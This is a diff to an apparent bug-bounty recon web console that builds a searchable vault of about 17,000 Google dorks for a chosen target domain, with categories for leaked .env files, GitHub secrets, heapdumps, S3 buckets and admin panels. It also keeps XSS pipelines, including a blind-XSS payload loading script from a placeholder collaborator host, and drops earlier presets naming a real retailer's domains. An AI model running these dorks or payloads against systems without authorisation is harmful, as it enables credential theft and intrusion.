@@ -979,6 +979,158 @@ body.theme-light .badge { background: #f8fafc; border-color: #e2e8f0; color: #64
   font-weight: 700;
   box-shadow: 0 0 10px rgba(245, 158, 11, 0.2);
 }
+/* Multi-Target Scope & Concept Explainer Architecture */
+.dork-multi-target-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(15, 23, 42, 0.7);
+  border: 1px solid rgba(56, 189, 248, 0.22);
+  border-radius: 8px;
+  padding: 8px 12px;
+  margin-bottom: 12px;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+.dork-target-selector-wrap {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+.dork-lbl {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: #94a3b8;
+  font-weight: 600;
+}
+.dork-select {
+  background: #06090f;
+  border: 1px solid rgba(56, 189, 248, 0.35);
+  color: #38bdf8;
+  padding: 4px 8px;
+  border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  font-weight: 700;
+  outline: none;
+  cursor: pointer;
+}
+.dork-nav-btn {
+  background: rgba(15, 23, 42, 0.9);
+  border: 1px solid rgba(56, 189, 248, 0.25);
+  color: #94a3b8;
+  border-radius: 4px;
+  padding: 3px 8px;
+  font-size: 10px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+.dork-nav-btn:hover {
+  border-color: #38bdf8;
+  color: #38bdf8;
+  background: rgba(56, 189, 248, 0.1);
+}
+.dork-badge-targets {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  background: rgba(56, 189, 248, 0.15);
+  color: #7dd3fc;
+  border: 1px solid rgba(56, 189, 248, 0.3);
+  padding: 2px 7px;
+  border-radius: 4px;
+  font-weight: 700;
+}
+.dork-mode-toggle-wrap {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  flex-wrap: wrap;
+}
+.dork-mode-btn {
+  background: rgba(15, 23, 42, 0.8);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  color: #94a3b8;
+  font-size: 11px;
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  padding: 4px 10px;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+.dork-mode-btn:hover {
+  border-color: #38bdf8;
+  color: #e2e8f0;
+}
+.dork-mode-btn.active {
+  background: rgba(56, 189, 248, 0.2);
+  border-color: #38bdf8;
+  color: #38bdf8;
+  box-shadow: 0 0 10px rgba(56, 189, 248, 0.25);
+}
+.dork-bulk-btn {
+  background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.2));
+  border: 1px solid rgba(245, 158, 11, 0.4);
+  color: #fbbf24;
+}
+.dork-bulk-btn:hover {
+  background: linear-gradient(135deg, rgba(245, 158, 11, 0.25), rgba(217, 119, 6, 0.35));
+  border-color: #fbbf24;
+  color: #fef3c7;
+  box-shadow: 0 0 12px rgba(245, 158, 11, 0.3);
+}
+
+.dork-concept-card {
+  background: rgba(15, 23, 42, 0.6);
+  border-left: 3px solid #38bdf8;
+  border-top: 1px solid rgba(56, 189, 248, 0.15);
+  border-right: 1px solid rgba(56, 189, 248, 0.15);
+  border-bottom: 1px solid rgba(56, 189, 248, 0.15);
+  border-radius: 6px;
+  padding: 10px 14px;
+  margin-bottom: 14px;
+  font-size: 12px;
+  line-height: 1.55;
+  color: #cbd5e1;
+}
+.dork-concept-title {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-weight: 700;
+  color: #38bdf8;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  margin-bottom: 4px;
+}
+.dork-concept-desc {
+  color: #94a3b8;
+  font-size: 11.5px;
+}
+
+body.theme-light .dork-multi-target-bar {
+  background: #f8fafc;
+  border-color: #cbd5e1;
+}
+body.theme-light .dork-select {
+  background: #ffffff;
+  border-color: #cbd5e1;
+  color: #0284c7;
+}
+body.theme-light .dork-concept-card {
+  background: #f8fafc;
+  border-color: #cbd5e1;
+  border-left-color: #0284c7;
+  color: #334155;
+}
+body.theme-light .dork-concept-title {
+  color: #0284c7;
+}
+body.theme-light .dork-concept-desc {
+  color: #64748b;
+}
+
 .gsearch-subbar {
   display: flex;
   align-items: center;
@@ -1192,50 +1344,7 @@ body.theme-light .gsearch-tag {
 </section>
 
 
-<!-- ================================================================
-     RECONFORGE UNIVERSAL DORK SEARCH CONSOLE
-     ================================================================ -->
-<section class="global-search-section" id="globalDorkSection">
-  <div class="global-search-card">
-    <div class="gsearch-header">
-      <div class="gsearch-title-wrap">
-        <span class="gsearch-title">🔍 RECONFORGE UNIVERSAL DORK SEARCH ENGINE</span>
-        <span class="gsearch-badge">17,071 LIVE DORKS EMBEDDED</span>
-      </div>
-      <div style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#94a3b8;">
-        Target: <strong id="gsearchTargetLabel" style="color:#38bdf8;">target.com</strong> (Auto-injected into queries)
-      </div>
-    </div>
-
-    <div class="gsearch-input-wrap">
-      <input type="text" id="globalDorkInput" class="gsearch-input" placeholder="🔍 Type any keyword to search 17,071 live dorks... (e.g. bug, aws, s3, .env, api, password, token)">
-      <button type="button" id="globalDorkClearBtn" class="gsearch-clear-btn" title="Clear search">✕</button>
-    </div>
-
-    <div class="gsearch-tags-row">
-      <span class="gsearch-tag active" data-cat="all">🌐 All 17,071 Dorks</span>
-      <span class="gsearch-tag" data-cat="elite">🔥 Top 1% Elite Vault (1,674)</span>
-      <span class="gsearch-tag" data-cat="cloud">☁ Cloud S3 &amp; Buckets</span>
-      <span class="gsearch-tag" data-cat="secrets">🔑 .env &amp; Secrets</span>
-      <span class="gsearch-tag" data-cat="actuators">📊 Actuators &amp; Heapdumps</span>
-      <span class="gsearch-tag" data-cat="admin">🚪 Admin Panels</span>
-      <span class="gsearch-tag" data-cat="api">⚡ APIs &amp; Swagger</span>
-      <span class="gsearch-tag" data-cat="sqli">💉 SQLi &amp; IDOR</span>
-      <span class="gsearch-tag" data-cat="bounty">🎯 Bug Bounty Programs</span>
-    </div>
-
-    <div class="gsearch-subbar">
-      <span>Showing <strong id="gsearchCount" style="color:#38bdf8;">0</strong> matching dorks</span>
-      <span>Click Copy or Google to execute directly &bull; Press <kbd style="background:#1e293b;padding:1px 5px;border-radius:3px;color:#38bdf8;">Ctrl+K</kbd> to focus</span>
-    </div>
-
-    <div class="gsearch-results" id="globalDorkResults">
-      <!-- Dork search cards rendered via JS -->
-    </div>
-  </div>
-</section>
-
-<section class="term-section">
+<section class="term-section" id="targetScopeSection">
   <div class="target-terminal-card">
     <div class="terminal-bar">
       <div class="terminal-dots">
@@ -1262,8 +1371,8 @@ body.theme-light .gsearch-tag {
           <button type="button" id="liveCheckBtn" class="btn-terminal-secondary" onclick="typeof startLiveCheck==='function'&&startLiveCheck()" title="Auto-check dorks against active target">
             ⚡ Live Check Dorks
           </button>
-          <button type="button" class="btn-terminal-secondary" onclick="document.getElementById('globalDorkInput').focus(); document.getElementById('globalDorkSection').scrollIntoView({behavior:'smooth'});" title="Search all 17,000+ Dorks with active target">
-            🔍 Universal Dork Search
+          <button type="button" class="btn-terminal-secondary" onclick="window.jumpToPhase21Dorks();" title="Jump to Phase 21: 17,071 Dork Vault">
+            🔍 Universal Dork Search (17,071)
           </button>
           <input type="file" id="domainFileInput" accept=".txt,.csv,.json,.yaml,.yml,.md,.log" style="display:none;">
         </div>
@@ -1272,8 +1381,9 @@ body.theme-light .gsearch-tag {
       <!-- Quick Target Presets Row -->
       <div class="target-presets-row">
         <span class="presets-lbl">Quick Demo Targets:</span>
-        <button type="button" class="preset-pill" onclick="injectPreset(['nykaa.com','nykaaman.com','nykaafashion.com','superstore.in'])">+ Nykaa Scope (4)</button>
-        <button type="button" class="preset-pill" onclick="injectPreset(['target.com','api.target.com','auth.target.io'])">+ Target.com (3)</button>
+        <button type="button" class="preset-pill" onclick="injectPreset(['example.com','api.example.com','auth.example.org','portal.example.net'])">+ Multi-Target Demo (4)</button>
+        <button type="button" class="preset-pill" onclick="injectPreset(['corp.example.com','api.corp.example.com','auth.corp.example.com'])">+ Enterprise Scope (3)</button>
+        <button type="button" class="preset-pill" onclick="injectPreset(['target-app.example.com','api.target-app.example.com','auth.target-app.example.com'])">+ Bug Bounty Scope (3)</button>
         <button type="button" class="preset-pill preset-clear" onclick="clearAllTargets()">✕ Clear Scope</button>
       </div>
 
@@ -1536,7 +1646,7 @@ echo target.com | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pip
 echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 
 <span class="comment"># blind xss via out-of-band collaborator</span>
-subfinder -d example.com | gau | bxss -payload '"><script src=https://YOUR-COLLAB></script>' -header "X-Forwarded-For"</code></pre></div></div></div>
+subfinder -d example.com | gau | bxss -payload '&quot;&gt;&lt;script src=https://YOUR-COLLAB&gt;&lt;/script&gt;' -header "X-Forwarded-For"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">23.</span>Local File Inclusion (LFI)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code>nuclei -l subs.txt -t nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
@@ -2325,14 +2435,84 @@ http://darksearch.io (clearnet mirror, indexes onion content)</code></pre></div>
     <div class="phase-head"><span class="tag">PHASE 21</span><h2>Embedded Mega Dork Database (17,071 dorks — searchable)</h2><span class="impact impact-crit">CRITICAL</span></div>
     <p class="phase-desc">Unified intelligence database containing 17,071 curated dorks — GHDB categorized vault (9,784) + admin/login discovery generator (297) + SQLi-prone parameter generator (3,370) — fully embedded directly inside this standalone engine. Browse by vulnerability category or perform unified instant search across all dorks. Every record includes a one-click automated Google/Bing search launcher.</p>
 
-    <div class="step open"><div class="step-head"><div class="step-title"><span class="idx">96.</span>Mega Dork Browser (all 17,071 entries)</div><div class="step-toggle">▼</div></div>
+    <div class="step open"><div class="step-head"><div class="step-title"><span class="idx">96.</span>Universal Mega Dork Engine &amp; Multi-Target Intelligence Vault (17,071 entries)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner">
-      <div class="mega-search-row">
-        <input type="text" id="megaSearch" class="osint-input" placeholder="🔍 search all 17,071 dorks... e.g. .env, backup, phpmyadmin, wp-content">
-        <span id="megaSearchCount" class="fcount"></span>
+
+      <!-- ================================================================
+           PHASE 21 UNIVERSAL DORK SEARCH & MULTI-TARGET CONSOLE
+           ================================================================ -->
+      <div class="global-search-card" id="globalDorkSection" style="margin-top:4px;">
+        <div class="gsearch-header">
+          <div class="gsearch-title-wrap">
+            <span class="gsearch-title">🔍 RECONFORGE UNIVERSAL DORK SEARCH ENGINE</span>
+            <span class="gsearch-badge">17,071 LIVE DORKS EMBEDDED</span>
+          </div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#94a3b8;">
+            Active Target: <strong id="gsearchTargetLabel" style="color:#38bdf8;">target.com</strong> (Auto-injected into queries)
+          </div>
+        </div>
+
+        <!-- Multi-Domain Control Panel (Syncs to all loaded domains) -->
+        <div class="dork-multi-target-bar" id="dorkMultiTargetBar">
+          <div class="dork-target-selector-wrap">
+            <span class="dork-lbl">🎯 Target Scope:</span>
+            <select id="dorkTargetSelect" class="dork-select" title="Switch active target domain"></select>
+            <button type="button" class="dork-nav-btn" id="dorkPrevTargetBtn" title="Previous target domain">◀</button>
+            <button type="button" class="dork-nav-btn" id="dorkNextTargetBtn" title="Next target domain">▶</button>
+            <span class="dork-badge-targets" id="dorkBadgeTargets">1 Target</span>
+          </div>
+          <div class="dork-mode-toggle-wrap">
+            <button type="button" class="dork-mode-btn active" id="dorkSingleModeBtn" title="Show dorks for current active target domain">🎯 Active Target</button>
+            <button type="button" class="dork-mode-btn" id="dorkCombinedModeBtn" title="Combine all loaded domains in Google OR query syntax">🌐 All Targets Combined</button>
+            <button type="button" class="dork-mode-btn dork-bulk-btn" id="dorkBulkExportBtn" title="Download wordlist of active category customized for ALL loaded targets">📥 Export for ALL Targets</button>
+          </div>
+        </div>
+
+        <!-- 13 Character-Wise Tabs -->
+        <div class="gsearch-tags-row">
+          <span class="gsearch-tag active" data-cat="all">🌐 All 17,071 Dorks</span>
+          <span class="gsearch-tag" data-cat="bbp">🎯 Paid BBP Programs (81)</span>
+          <span class="gsearch-tag" data-cat="vdp">🛡️ VDP &amp; Security.txt (40)</span>
+          <span class="gsearch-tag" data-cat="elite">🔥 Top 1% Elite (1,674)</span>
+          <span class="gsearch-tag" data-cat="github">🐙 GitHub Secrets (591)</span>
+          <span class="gsearch-tag" data-cat="shodan">🔍 Shodan Recon (97)</span>
+          <span class="gsearch-tag" data-cat="cloud">☁ Cloud S3 &amp; Storage</span>
+          <span class="gsearch-tag" data-cat="secrets">🔑 .env &amp; Passwords (310)</span>
+          <span class="gsearch-tag" data-cat="admin">🚪 Admin Panels (1,075)</span>
+          <span class="gsearch-tag" data-cat="api">⚡ APIs &amp; Swagger</span>
+          <span class="gsearch-tag" data-cat="sqli">💉 SQLi &amp; IDOR (4,000)</span>
+          <span class="gsearch-tag" data-cat="actuators">📊 Actuators &amp; Dumps</span>
+          <span class="gsearch-tag" data-cat="backups">📁 Open Dirs &amp; Backups (174)</span>
+        </div>
+
+        <!-- Dynamic Concept Explainer Card -->
+        <div class="dork-concept-card" id="dorkConceptCard">
+          <div class="dork-concept-title" id="dorkConceptTitle">🌐 Master Intelligence Architecture</div>
+          <div class="dork-concept-desc" id="dorkConceptDesc">Unified instant search across all 17,071 curated intelligence records. Use keyword filters, regex, or specific parameters with active target auto-injection.</div>
+        </div>
+
+        <!-- Search Bar -->
+        <div class="gsearch-input-wrap">
+          <input type="text" id="globalDorkInput" class="gsearch-input" placeholder="🔍 Type any keyword to search live dorks... (e.g. bug, aws, s3, .env, api, password, token)">
+          <button type="button" id="globalDorkClearBtn" class="gsearch-clear-btn" title="Clear search">✕</button>
+        </div>
+
+        <div class="gsearch-subbar">
+          <div>
+            <span>Showing <strong id="gsearchCount" style="color:#38bdf8;">0</strong> matching dorks</span>
+            <span style="margin-left:8px;color:#64748b;font-size:11px;">Press <kbd style="background:#1e293b;padding:1px 5px;border-radius:3px;color:#38bdf8;">Ctrl+K</kbd> to search</span>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <button type="button" class="dork-nav-btn" id="dorkCopyAllBtn" style="padding:4px 10px;font-size:11px;" title="Copy all displayed dork queries">📋 Copy Visible</button>
+            <button type="button" class="dork-nav-btn dork-bulk-btn" id="dorkDownloadCategoryBtn" style="padding:4px 10px;font-size:11px;" title="Download raw wordlist for current category">📂 Download Wordlist</button>
+          </div>
+        </div>
+
+        <div class="gsearch-results" id="globalDorkResults">
+          <!-- Dork search cards rendered via JS -->
+        </div>
       </div>
-      <div id="megaCats" class="mega-cats"></div>
-      <div id="megaResults" class="mega-results"></div>
+
     </div></div></div>
   </div>
 
@@ -5372,8 +5552,10 @@ function hookApply(){
   if(!origRef) return;
   window.applyDomainEverywhere = function(domain){
     origRef(domain);
-    // After domain injected, clear cache for this new domain and restart live check
-    setTimeout(()=>{ startLiveCheck(); }, 500);
+    // Only restart live check if user had explicitly enabled/started it
+    if(typeof checksRunning !== 'undefined' && checksRunning){
+      setTimeout(()=>{ startLiveCheck(); }, 500);
+    }
   };
   window._liveCheckHooked = true;
 }
@@ -7433,6 +7615,63 @@ echo -e "\${C_CYAN}=============================================================
 <script>
 (function(){
   var megaCache = null;
+  window.activeTargetIndex = 0;
+  window.multiTargetCombinedMode = false;
+
+  var TAB_CONCEPTS = {
+    all: {
+      title: '🌐 Master Intelligence Architecture (17,071 Live Dorks)',
+      desc: 'Unified instant search across all 17,071 curated intelligence records. Use keyword filters, regex, or specific parameters with active multi-target auto-injection.'
+    },
+    bbp: {
+      title: '🎯 Paid Bug Bounty Programs (BBP Asset & Bounty Scopes)',
+      desc: 'Targets official platform briefs on HackerOne, Bugcrowd, Intigriti, and undisclosed corporate bounty programs with active cash payouts, reward tables, and authorized asset definitions.'
+    },
+    vdp: {
+      title: '🛡️ Vulnerability Disclosure Policies & RFC 9116 Security.txt',
+      desc: 'Discovers RFC 9116 security.txt contact routes, responsible disclosure terms, safe-harbor clauses, and Hall of Fame programs for direct coordination and authorized disclosure.'
+    },
+    elite: {
+      title: '🔥 Top 1% Elite Vault (P1/P2 Exploits & High-Impact Cloud Leaks)',
+      desc: 'Highest-conversion P1/P2 dorks curated for fast critical severity triage: exposed cloud credentials, RCE-prone actuator endpoints, git config leaks, and unauthenticated control panels.'
+    },
+    github: {
+      title: '🐙 GitHub Secrets & Developer Credential Harvester',
+      desc: 'Passive source-code reconnaissance hunting for developer secrets committed to public GitHub repositories: AWS keys, Stripe tokens, Slack webhooks, JWT signing keys, and private SSH keys.'
+    },
+    shodan: {
+      title: '🔍 Shodan OSINT & Network Perimeter Intelligence',
+      desc: 'Infrastructure reconnaissance queries designed to bypass CDN/WAF defenses: uncover real origin server IPs, exposed Redis/Elasticsearch ports, and SSL certificate fingerprints.'
+    },
+    cloud: {
+      title: '☁ Cloud Storage & S3 Bucket Discovery',
+      desc: 'Locates publicly accessible AWS S3 buckets, Google Cloud Storage buckets, Azure Blob containers, and public object storage holding corporate backups or customer documents.'
+    },
+    secrets: {
+      title: '🔑 Passwords, .env Files & Sensitive Configuration Dumps',
+      desc: 'Uncovers server environment files and database configuration parameters left in web document roots: .env, wp-config.php, web.config, settings.py, and plaintext connection strings.'
+    },
+    admin: {
+      title: '🚪 Admin Portals, SSO Gateways & Internal Login Dashboards',
+      desc: 'Surfaces authentication attack surface: employee Single Sign-On (SSO) gateways, Okta/Keycloak portals, Jira/Confluence instances, phpMyAdmin, and internal dashboard consoles.'
+    },
+    api: {
+      title: '⚡ API Discovery, Swagger UI & GraphQL Endpoints',
+      desc: 'Finds interactive API documentation: exposed Swagger/OpenAPI JSON specifications, GraphQL consoles (/graphql, /graphiql), and unauthenticated microservice routing endpoints.'
+    },
+    sqli: {
+      title: '💉 SQLi & IDOR High-Signal Parameter Fuzzing',
+      desc: 'Target URL parameters and dynamic routing paths historically prone to SQL injection, Insecure Direct Object References (IDOR), and database syntax error disclosure.'
+    },
+    actuators: {
+      title: '📊 Spring Boot Actuators & JVM Memory Heapdumps',
+      desc: 'Spring Boot management endpoints (/actuator/heapdump, /actuator/env, /metrics) exposing live JVM RAM dumps containing active plaintext passwords, decryption keys, and environment tokens.'
+    },
+    backups: {
+      title: '📁 Open Directories, Database Dumps & Server Archives',
+      desc: 'Discovers Apache/Nginx directory listings (Index of /), database backups (.sql.gz, .dump), and zipped archive snapshots exposing entire backend application source code.'
+    }
+  };
 
   function loadMegaData(){
     if(megaCache) return megaCache;
@@ -7448,25 +7687,30 @@ echo -e "\${C_CYAN}=============================================================
     return {};
   }
 
-  function getActiveDomain(){
-    if(typeof DOMAINS !== 'undefined' && Array.isArray(DOMAINS) && DOMAINS.length && DOMAINS[0]){
-      return DOMAINS[0];
+  function getAllLoadedDomains(){
+    if(typeof DOMAINS !== 'undefined' && Array.isArray(DOMAINS) && DOMAINS.length > 0){
+      return DOMAINS;
     }
     var mini = document.getElementById('miniDomainInput');
     if(mini && mini.value && mini.value.trim()){
-      return mini.value.trim();
+      return [mini.value.trim()];
     }
     var scopeInp = document.getElementById('domainInput');
     if(scopeInp && scopeInp.value && scopeInp.value.trim()){
-      var first = scopeInp.value.trim().split(/[\s,;\n]+/)[0];
-      if(first){
-        var cleaned = first.replace(/^(?:https?:\/\/)?(?:\*\.)?/i, '').replace(/[\/:?#].*$/, '').trim();
-        if(cleaned && cleaned.indexOf('.') !== -1){
-          return cleaned;
-        }
-      }
+      var list = scopeInp.value.trim().split(/[\s,;\n]+/).map(function(s){
+        return s.replace(/^(?:https?:\/\/)?(?:\*\.)?/i, '').replace(/[\/:?#].*$/, '').trim();
+      }).filter(function(s){ return s && s.indexOf('.') !== -1; });
+      if(list.length) return list;
     }
-    return 'target.com';
+    return ['target.com'];
+  }
+
+  function getActiveDomain(){
+    var domains = getAllLoadedDomains();
+    if(window.activeTargetIndex >= domains.length){
+      window.activeTargetIndex = 0;
+    }
+    return domains[window.activeTargetIndex] || 'target.com';
   }
 
   function escHtml(str){
@@ -7493,19 +7737,71 @@ echo -e "\${C_CYAN}=============================================================
       escapedText.slice(idx + q.length);
   }
 
+  function updateConceptCard(catKey){
+    var concept = TAB_CONCEPTS[catKey] || TAB_CONCEPTS.all;
+    var titleEl = document.getElementById('dorkConceptTitle');
+    var descEl = document.getElementById('dorkConceptDesc');
+    if(titleEl) titleEl.textContent = concept.title;
+    if(descEl) descEl.textContent = concept.desc;
+  }
+
+  function updateTargetSelectorUI(){
+    var domains = getAllLoadedDomains();
+    var sel = document.getElementById('dorkTargetSelect');
+    var badge = document.getElementById('dorkBadgeTargets');
+    var targetLabel = document.getElementById('gsearchTargetLabel');
+    var singleBtn = document.getElementById('dorkSingleModeBtn');
+    var combBtn = document.getElementById('dorkCombinedModeBtn');
+
+    if(targetLabel){
+      if(window.multiTargetCombinedMode && domains.length > 1){
+        targetLabel.textContent = 'All ' + domains.length + ' Targets (Combined)';
+      } else {
+        targetLabel.textContent = getActiveDomain();
+      }
+    }
+
+    if(badge){
+      badge.textContent = domains.length + (domains.length === 1 ? ' Target' : ' Targets Loaded');
+    }
+
+    if(sel){
+      var currentVal = window.activeTargetIndex;
+      sel.innerHTML = '';
+      domains.forEach(function(dom, idx){
+        var opt = document.createElement('option');
+        opt.value = idx;
+        opt.textContent = (idx + 1) + '. ' + dom;
+        if(idx === currentVal) opt.selected = true;
+        sel.appendChild(opt);
+      });
+    }
+
+    if(singleBtn && combBtn){
+      if(window.multiTargetCombinedMode){
+        singleBtn.classList.remove('active');
+        combBtn.classList.add('active');
+      } else {
+        singleBtn.classList.add('active');
+        combBtn.classList.remove('active');
+      }
+    }
+  }
+
   window.runGlobalDorkSearch = function(){
     var input = document.getElementById('globalDorkInput');
     var resultsBox = document.getElementById('globalDorkResults');
     var countBox = document.getElementById('gsearchCount');
-    var targetLabel = document.getElementById('gsearchTargetLabel');
     if(!input || !resultsBox) return;
 
-    var query = input.value.trim().toLowerCase();
-    var domain = getActiveDomain();
-    if(targetLabel) targetLabel.textContent = domain;
+    var domains = getAllLoadedDomains();
+    var activeDomain = getActiveDomain();
+    updateTargetSelectorUI();
 
+    var query = input.value.trim().toLowerCase();
     var activeChip = document.querySelector('.gsearch-tag.active');
     var activeCat = activeChip ? activeChip.getAttribute('data-cat') : 'all';
+    updateConceptCard(activeCat);
 
     var data = loadMegaData();
     var results = [];
@@ -7519,11 +7815,21 @@ echo -e "\${C_CYAN}=============================================================
         var matchCat = false;
         if(activeCat === 'elite' && (catLower.indexOf('top 1%') !== -1 || catLower.indexOf('elite') !== -1)){
           matchCat = true;
+        } else if(activeCat === 'bbp'){
+          if(catLower.indexOf('platform programs') !== -1 || catLower.indexOf('region / country') !== -1 || catLower.indexOf('enterprise & startup') !== -1 || catLower.indexOf('new & recently') !== -1 || catLower.indexOf('corporate targets') !== -1 || catLower.indexOf('specific program scopes') !== -1){
+            matchCat = true;
+          }
+        } else if(activeCat === 'vdp'){
+          if(catLower.indexOf('responsible disclosure') !== -1 || catLower.indexOf('security.txt') !== -1 || catLower.indexOf('policies') !== -1){
+            matchCat = true;
+          }
+        } else if(activeCat === 'github' && (catLower.indexOf('github') !== -1 || catLower.indexOf('leaked tokens') !== -1)){
+          matchCat = true;
+        } else if(activeCat === 'shodan' && catLower.indexOf('shodan') !== -1){
+          matchCat = true;
         } else if(activeCat === 'cloud' && (catLower.indexOf('cloud') !== -1 || catLower.indexOf('s3') !== -1 || catLower.indexOf('bucket') !== -1 || catLower.indexOf('storage') !== -1)){
           matchCat = true;
-        } else if(activeCat === 'secrets' && (catLower.indexOf('.env') !== -1 || catLower.indexOf('secret') !== -1 || catLower.indexOf('key') !== -1 || catLower.indexOf('credential') !== -1 || catLower.indexOf('token') !== -1)){
-          matchCat = true;
-        } else if(activeCat === 'actuators' && (catLower.indexOf('actuator') !== -1 || catLower.indexOf('heapdump') !== -1 || catLower.indexOf('metrics') !== -1 || catLower.indexOf('spring') !== -1)){
+        } else if(activeCat === 'secrets' && (catLower.indexOf('.env') !== -1 || catLower.indexOf('secret') !== -1 || catLower.indexOf('key') !== -1 || catLower.indexOf('credential') !== -1 || catLower.indexOf('password') !== -1 || catLower.indexOf('token') !== -1)){
           matchCat = true;
         } else if(activeCat === 'admin' && (catLower.indexOf('admin') !== -1 || catLower.indexOf('panel') !== -1 || catLower.indexOf('login') !== -1 || catLower.indexOf('dashboard') !== -1)){
           matchCat = true;
@@ -7531,7 +7837,9 @@ echo -e "\${C_CYAN}=============================================================
           matchCat = true;
         } else if(activeCat === 'sqli' && (catLower.indexOf('sqli') !== -1 || catLower.indexOf('sql') !== -1 || catLower.indexOf('idor') !== -1 || catLower.indexOf('injection') !== -1 || catLower.indexOf('traversal') !== -1)){
           matchCat = true;
-        } else if(activeCat === 'bounty' && (catLower.indexOf('bounty') !== -1 || catLower.indexOf('disclosure') !== -1 || catLower.indexOf('program') !== -1 || catLower.indexOf('security.txt') !== -1)){
+        } else if(activeCat === 'actuators' && (catLower.indexOf('actuator') !== -1 || catLower.indexOf('heapdump') !== -1 || catLower.indexOf('metrics') !== -1 || catLower.indexOf('spring') !== -1)){
+          matchCat = true;
+        } else if(activeCat === 'backups' && (catLower.indexOf('open directory') !== -1 || catLower.indexOf('backup') !== -1 || catLower.indexOf('database dumps') !== -1)){
           matchCat = true;
         }
         if(!matchCat) continue;
@@ -7578,14 +7886,58 @@ echo -e "\${C_CYAN}=============================================================
     var html = '';
     for(var j = 0; j < results.length; j++){
       var item = results[j];
-      var renderedDork = item.dork.replace(/target\.com/g, domain);
+      var renderedDork = '';
+
+      if(window.multiTargetCombinedMode && domains.length > 1){
+        if(item.dork.indexOf('site:target.com') !== -1){
+          var siteList = domains.slice(0, 4).map(function(d){ return 'site:' + d; }).join(' | ');
+          renderedDork = item.dork.replace(/site:target\.com/g, '(' + siteList + ')');
+        } else {
+          renderedDork = item.dork.replace(/target\.com/g, activeDomain);
+        }
+      } else {
+        renderedDork = item.dork.replace(/target\.com/g, activeDomain);
+      }
+
       var googleUrl = 'https://www.google.com/search?q=' + encodeURIComponent(renderedDork);
       var encodedDork = encodeURIComponent(renderedDork);
+
+      var catLow = item.cat.toLowerCase();
+      var badgeStyle = 'color:#38bdf8;background:rgba(56,189,248,0.1);border:1px solid rgba(56,189,248,0.25);';
+      var badgeIcon = '🏷️';
+      if(catLow.indexOf('top 1%') !== -1 || catLow.indexOf('elite') !== -1){
+        badgeStyle = 'color:#f59e0b;background:rgba(245,158,11,0.12);border:1px solid rgba(245,158,11,0.3);';
+        badgeIcon = '🔥';
+      } else if(catLow.indexOf('platform programs') !== -1 || catLow.indexOf('corporate targets') !== -1 || catLow.indexOf('new & recently') !== -1 || catLow.indexOf('region') !== -1 || catLow.indexOf('enterprise') !== -1){
+        badgeStyle = 'color:#ec4899;background:rgba(236,72,153,0.12);border:1px solid rgba(236,72,153,0.3);';
+        badgeIcon = '🎯 BBP:';
+      } else if(catLow.indexOf('responsible disclosure') !== -1 || catLow.indexOf('security.txt') !== -1 || catLow.indexOf('policies') !== -1){
+        badgeStyle = 'color:#38bdf8;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.3);';
+        badgeIcon = '🛡️ VDP:';
+      } else if(catLow.indexOf('github') !== -1){
+        badgeStyle = 'color:#a855f7;background:rgba(168,85,247,0.12);border:1px solid rgba(168,85,247,0.3);';
+        badgeIcon = '🐙 GitHub:';
+      } else if(catLow.indexOf('shodan') !== -1){
+        badgeStyle = 'color:#ef4444;background:rgba(239,68,68,0.12);border:1px solid rgba(239,68,68,0.3);';
+        badgeIcon = '🔍 Shodan:';
+      } else if(catLow.indexOf('admin') !== -1 || catLow.indexOf('login') !== -1){
+        badgeStyle = 'color:#f97316;background:rgba(249,115,22,0.12);border:1px solid rgba(249,115,22,0.3);';
+        badgeIcon = '🚪 Admin:';
+      } else if(catLow.indexOf('sqli') !== -1 || catLow.indexOf('sql') !== -1){
+        badgeStyle = 'color:#10b981;background:rgba(16,185,129,0.12);border:1px solid rgba(16,185,129,0.3);';
+        badgeIcon = '💉 SQLi:';
+      } else if(catLow.indexOf('.env') !== -1 || catLow.indexOf('password') !== -1 || catLow.indexOf('credential') !== -1){
+        badgeStyle = 'color:#eab308;background:rgba(234,179,8,0.12);border:1px solid rgba(234,179,8,0.3);';
+        badgeIcon = '🔑 Secrets:';
+      } else if(catLow.indexOf('open directory') !== -1 || catLow.indexOf('backup') !== -1 || catLow.indexOf('database dumps') !== -1){
+        badgeStyle = 'color:#84cc16;background:rgba(132,204,22,0.12);border:1px solid rgba(132,204,22,0.3);';
+        badgeIcon = '📁 Backup:';
+      }
 
       html += '<div class="gsearch-item">' +
         '<div class="gsearch-main">' +
           '<div class="gsearch-query">' + highlightMatches(renderedDork, query) + '</div>' +
-          '<span class="gsearch-cat">' + escHtml(item.cat) + '</span>' +
+          '<span class="gsearch-cat" style="' + badgeStyle + '">' + badgeIcon + ' ' + escHtml(item.cat) + '</span>' +
         '</div>' +
         '<div class="gsearch-actions">' +
           '<button type="button" class="gsearch-btn gsearch-copy-btn" data-dork="' + encodedDork + '" title="Copy query to clipboard">📋 Copy</button>' +
@@ -7596,6 +7948,55 @@ echo -e "\${C_CYAN}=============================================================
     resultsBox.innerHTML = html;
   };
 
+  window.exportCategoryDorksForAllTargets = function(){
+    var activeChip = document.querySelector('.gsearch-tag.active');
